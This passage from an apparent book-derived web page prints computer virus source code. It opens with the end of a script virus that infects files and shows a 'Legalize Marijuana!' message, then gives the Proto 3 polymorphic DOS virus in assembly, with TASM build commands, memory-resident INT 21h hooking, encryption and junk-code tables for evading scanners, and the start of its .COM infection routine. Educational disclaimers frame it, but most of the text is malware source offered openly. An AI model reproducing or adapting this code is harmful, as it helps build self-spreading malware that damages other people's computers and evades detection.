&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FWrite<span style="color: black;">&#40;</span>Title<span style="color: #339933;">,</span><span style="color: black;">&#40;</span>CurTime<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: #0000dd;">254</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>Handle<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black; font-style: italic;">// Make size random (even)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FClose<span style="color: black;">&#40;</span>Handle<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
Quit_Infect<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; call<span style="color: black;">&#40;</span>Spawned_On<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Start orig. script</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>EndHeader<span style="color: #339933;">==</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> and&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// If all infected</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>CurTime<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Show message 1 out of 8 times</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Status_Wind<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Legalize Marijuana! - ÂÚ³ äïÂ&quot;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">10</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
<span style="color: black;">&#125;</span><br />
&nbsp;</div>
<h3><a name="pj6"></a>Proto 3</h3>
<p>The <strong>Proto 3</strong> virus has been saved until the last as it contains one of the most advanced routines used in computer virus development. The virus encrypts itself using a polymorphic engine. Because of this, no two infections are the same. (Actually, this is not quite true. However, the number of different encryption engines created by the engine is so great that it will probably never repeat itself entirely).</p>
<p>Scan strings cannot be made from this virus. Because it is such a dangerous technology, the <strong>Proto 3</strong> was written for 386+ computers. XT's or 286's will simply crash if any attempt is made to execute the virus.</p>
<p><strong>Proto 3</strong> is a very complicated virus. The comments will help the advanced computer hacker to understand the routines.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">COMMENT~===============================================================<br />
=<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proto <span style="color: #ff0000;">3</span> Virus<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">-------------</span><br />
= &nbsp; &nbsp; &nbsp; &nbsp; Dissassembly <span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span><span style="color: #ff0000;">1993</span> Lucifer Messiah <span style="color: #339933;">--</span> ANARKICK SYSTEMS<br />
= &nbsp; &nbsp; &nbsp; &nbsp; Edited by<span style="color: #339933;">:</span> Karsten Johansson<span style="color: #339933;">,</span> PC Scavenger<br />
=<br />
=======================================================================<br />
=<br />
=<br />
= &nbsp;CAUTION<span style="color: #339933;">:</span> &nbsp;This program is a polymorphic virus<span style="color: #339933;">.</span><br />
=<br />
= &nbsp;NOTES<span style="color: #339933;">:</span> &nbsp; &nbsp;This is a demonstration virus only<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">and</span> will only execute<br />
<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;on the <span style="color: #ff0000;">386</span><span style="color: #339933;">+</span> computer<span style="color: #339933;">.</span> This was done to avoid widespread<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;misuse<span style="color: #339933;">.</span><br />
=<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">DO</span> <span style="color: #00007f; font-weight: bold;">NOT</span> INFECT ANYONE<span style="color: #7f007f;">'S SYSTEM BUT YOUR OWN! To do so is a<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;federal offence.<br />
=<br />
= &nbsp;COMPILE: &nbsp;With TASM: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TASM PROTO3<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TLINK /3 PROTO3<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EXE2BIN PROTO3 PROTO3.COM<br />
=<br />
= &nbsp;INSTALL: &nbsp;Execute PROTO3.COM on a 386 or above only. Only .COM files<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;will be infected.<br />
=<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Execution on an 8086 or 286 computer will result in a<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;crash.<br />
=<br />
=======================================================================<br />
=<br />
=<br />
= &nbsp;BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND<br />
= &nbsp;PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT MAY<br />
= &nbsp;BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER<br />
= &nbsp;VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS NOT<br />
= &nbsp;HERE TO BE ABUSED.<br />
=<br />
=======================================================================<br />
~<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .RADIX&nbsp; 16<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .model&nbsp; tiny<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; P386N &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;386 Non-Protected mode<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .code<br />
<br />
;--- Data area --------------------------------------------<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; 0E0h<br />
<br />
File_Len&nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0, 0<br />
INT21 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0, 0<br />
ADD_Val &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
XOR_Val &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
XOR_Ofs &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
ByteFill&nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
ByteFill2 &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
<br />
;--- Virus entry point ------------------------------------<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; 100h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;.COM file<br />
<br />
Entry:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Delta &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get IP<br />
<br />
Delta:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; si,(Delta-Entry)&nbsp; &nbsp; &nbsp; &nbsp; ;SI=delta offset<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; di,100h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;DI=COM start offset<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax ds es di si&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save registers<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; ax,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ax=0FFFFh (residency check)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;INT 3=INT 21h if resident<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; al,ah<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short exit_inst<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,es &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;adjust memory-size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; bx,bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; byte ptr [bx],5Ah &nbsp; &nbsp; &nbsp; ;enough memory available?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; short exit_inst &nbsp; &nbsp; &nbsp; &nbsp; ;don'</span>t install if there isn<span style="color: #7f007f;">'t<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,[bx+3]<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; ax,(0D0h + 160h)&nbsp; &nbsp; &nbsp; &nbsp; ;space for virus + workspace<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; short exit_inst<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; [bx+3],ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; word ptr ds:[bx+12h],(0D0h+160h) ;virus and workspace<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; es,[bx+12h]<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,(last - Entry)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rep &nbsp; &nbsp; movsb &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;copy virus to top of memory<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,3521h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get original int21 vector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds:[INT21],bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds:[INT21+2],es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; dx,INT_21h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;install new INT 3 handler<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,2503h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; dx,INT_21h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;install INT 21h with same<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,2521h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; handler<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,'</span>rn<span style="color: #7f007f;">' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;init. random nr. generator<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
<br />
exit_inst:<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; si di es ds ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;restore registers<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; si,(offset Orig_Bytes)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; si,di<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; di<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; movsd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;read first 4 bytes from Orig_Bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret<br />
<br />
;--- Encryption tables ------------------------------------<br />
; AX AL AH<br />
<br />
mov_register&nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0B8h, 0B0h, 0B4h, 0<br />
; (BX) BL BH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0B8h, 0B3h, 0B7h, 0<br />
; CX DL CH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0B9h, 0B1h, 0B5h<br />
<br />
; nop clc decbp cld incbp stc cli cmc<br />
junk_1byte&nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 90h, 0f8h, 4dh, 0fch, 45h, 0f9h, 0fah, 0f5h<br />
<br />
; repz repnz repz repnz incbp stc cli repnz<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0f3h, 0f2h, 0F3h, 0F2h, 45h, 0f9h, 0fah, 0f2h<br />
<br />
; or and xchg mov<br />
junk_2byte&nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 8, 20h, 84h, 88h<br />
<br />
; bl / bh, bx, si&amp;di<br />
dir_change&nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 7, 7, 4, 5<br />
ind_change&nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 3, 3, 6, 7<br />
<br />
; xor xor add sub<br />
enc_type&nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 30h, 30h, 0, 28h<br />
<br />
; add xor or<br />
add_mode&nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0, 0C8h, 0F0h, 0C0h<br />
<br />
;--- NOP and JUNK offsets ---------------------------------<br />
<br />
NOPSets &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset Cond_JMP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset JMP_Over<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset XCHG_AX_Reg2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset INC_DEC2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset Byte_NOP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset Word_NOP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset CALL_NOPs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset Move_Something<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset abcd1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset abcd2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset abcd3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset JMP_Up<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset CMPS_SCAS<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset XCHG_AX_Reg<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset PUSH_POP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset INC_DEC<br />
<br />
;--- INT 24h handler --------------------------------------<br />
<br />
INT_24h:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; al,3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;to avoid '</span>Abort<span style="color: #339933;">,</span> Retry<span style="color: #339933;">,...</span><span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iret<br />
<br />
;--- first bunch of bytes ---------------------------------<br />
Orig_Bytes&nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0CDh, 20h, 0, 0 &nbsp; &nbsp; &nbsp; &nbsp; ;First 4 bytes of host<br />
<br />
;--- INT 21h handler --------------------------------------<br />
Signature:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ax=0<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; popf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iret<br />
<br />
Initialize:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Initialize_RNG<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; short exit_21<br />
<br />
;--- INT 21h entry point ----------------------------------<br />
INT_21h:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,0FFFFh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;install check?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Signature<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; es ds si di dx cx bx ax ;save registers<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,'</span>rn<span style="color: #7f007f;">' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;rnd init ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short initialize<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,4B00h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;execute ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Do_It<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,6C00h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;open<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; short exit_21<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; test&nbsp; &nbsp; bl,3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jnz &nbsp; &nbsp; short exit_21<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,di<br />
<br />
Do_It:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; infect<br />
<br />
Exit_21:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax bx cx dx di si ds es ;restore registers<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; popf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; dword ptr cs:[INT21]&nbsp; &nbsp; ;call to old int-handler<br />
<br />
;--- Infect file ------------------------------------------<br />
Infect:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;copy filename to CS:0000<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; di,di<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,80h<br />
<br />
Upper_Case:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsb<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; al,al<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jz&nbsp; &nbsp; &nbsp; converted<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; al,'</span>a<span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; short next_char<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; al,'</span>z<span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ja&nbsp; &nbsp; &nbsp; next_char<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; al,20h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;convert to upper case<br />
<br />
next_char:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stosb<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; loop&nbsp; &nbsp; Upper_Case<br />
<br />
Exit_Inf:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret<br />
<br />
converted:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stosb &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;convert to ASCIIZ<br />
